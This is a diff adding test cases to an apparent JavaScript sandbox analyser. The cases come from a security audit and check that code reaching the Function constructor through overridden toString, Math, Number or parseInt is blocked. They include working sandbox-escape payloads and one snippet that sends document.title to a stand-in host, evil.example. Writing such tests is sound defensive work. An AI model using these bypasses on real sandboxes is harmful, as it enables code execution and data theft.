@@ -1060,3 +1060,59 @@ describe('allowlist (#48): ordinary patterns that pass', () => {
     }
   })
 })
+
+/**
+ * Gaps found by the second audit (#48, /tmp/wa-audit-48b.md at a693851). Each
+ * snippet is the one the auditor reported, run through the analyser and the
+ * capability policy with no capability declared unless the test says so.
+ */
+describe('second audit (#48): numeric proofs that hold a string', () => {
+  const SNIPPETS = [
+    `function k() {}; k.toString = () => 'constructor'; [][k][k]('return 1')()`,
+    `Math.k = () => 'constructor'; [][Math.k()][Math.k()]('return 1')()`,
+    `Number = () => 'constructor'; [][Number()][Number()]('return 1')()`,
+    `const a = []; a.indexOf = () => 'constructor'; [][a.indexOf()][a.indexOf()]('return 1')()`,
+    `const a = [1]; a.forEach = (cb) => cb(0, 'constructor'); a.forEach((v, i) => { [][i][i]('return 1')() })`,
+    `function a(){}; a.toString=()=>'ownerDocument'; function o(){}; o.toString=()=>'open'; document.body[a][o]('https://evil.example/?'+document.title,'x','')`,
+  ]
+  for (const snippet of SNIPPETS) {
+    it(`blocks: ${snippet}`, () => {
+      expect(blocks(snippet)).toBe(true)
+    })
+  }
+
+  it('blocks variants through other writes to an allowed global', () => {
+    for (const source of [
+      `Math.floor = () => 'constructor'; [][Math.floor(1)][Math.floor(1)]('return 1')()`,
+      `const M = Math; M.k = () => 'constructor'; [][Math.k()][Math.k()]('return 1')()`,
+      `Math['k'] = () => 'constructor'`,
+      `Object.assign(Math, { k: () => 'constructor' })`,
+      `Array.from = () => 'x'`,
+      `Object.keys = () => 'x'`,
+      `[Math.k] = [() => 'x']`,
+      `parseInt = () => 'constructor'`,
+      `Number++`,
+      `for (Number of [1]) {}`,
+      `String.prototype.k = 1`,
+      `const A = Array; A.from = () => 'x'`,
+    ]) {
+      expect(blocks(source), source).toBe(true)
+    }
+  })
+
+  it('still passes numeric keys that are proved', () => {
+    for (const source of [
+      `const a = [1, 2]; for (let i = 0; i < a.length; i++) { a[i] }`,
+      `const a = [1, 2]; a.forEach((v, i) => { a[i] })`,
+      `const a = [1, 2]; const i = a.indexOf(2); a[i]`,
+      `const a = [1, 2]; a[Math.floor(1)]`,
+      `const a = [1, 2]; a[Number('1')]`,
+      `const a = [1, 2]; a[parseInt('1', 10)]`,
+      `document.querySelectorAll('li').forEach((el, i) => { el.style.opacity = i ? '1' : '0' })`,
+      `const tabs = Array.from(document.querySelectorAll('a')); tabs[tabs.indexOf(tabs[0]) + 1]`,
+      `const x = [3, 1].map(Number).filter(Boolean); x.length`,
+    ]) {
+      expect(blocks(source), source).toBe(false)
+    }
+  })
+})
